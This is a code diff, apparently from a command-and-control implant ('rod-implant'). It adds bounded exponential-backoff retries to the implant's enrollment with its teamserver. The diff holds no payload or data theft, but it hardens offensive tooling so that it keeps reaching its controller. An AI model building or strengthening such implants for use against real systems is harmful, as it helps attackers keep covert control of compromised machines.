@@ -69,7 +69,7 @@ internal static class ImplantApp
         Enrollment enrollment;
         try
         {
-            enrollment = await C2.EnrollAsync(enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cts.Token);
+            enrollment = await EnrollWithRetryAsync(enrollUrl, config, privateKey, serverCAs, cts.Token);
         }
         catch (Exception ex)
         {
@@ -113,6 +113,50 @@ internal static class ImplantApp
         }
 
         return 0;
+    }
+
+    // Enrolls with bounded retries: a transient failure (teamserver restarting,
+    // network flap) backs off exponentially, while a definitive rejection (bad,
+    // spent, or expired token, malformed response) fails immediately -- retrying
+    // would not change that answer.
+    private static async Task<Enrollment> EnrollWithRetryAsync(
+        string enrollUrl,
+        Config config,
+        RSA privateKey,
+        X509Certificate2Collection? serverCAs,
+        CancellationToken cancellationToken)
+    {
+        const int maxAttempts = 5;
+        for (var attempt = 1; ; attempt++)
+        {
+            try
+            {
+                return await C2.EnrollAsync(
+                    enrollUrl, config.StagerToken, parentImplantId: null, privateKey, serverCAs, config.Transport, cancellationToken);
+            }
+            catch (C2.EnrollRejectedException)
+            {
+                throw;
+            }
+            catch (OperationCanceledException)
+            {
+                throw;
+            }
+            catch (Exception ex)
+            {
+                if (attempt == maxAttempts)
+                    throw;
+                Console.Error.WriteLine($"rod-implant: enroll attempt {attempt} failed: {ex.Message}; retrying");
+                try
+                {
+                    await Task.Delay(TimeSpan.FromSeconds(Math.Pow(2, attempt)), cancellationToken);
+                }
+                catch (OperationCanceledException)
+                {
+                    throw;
+                }
+            }
+        }
     }
 }
 
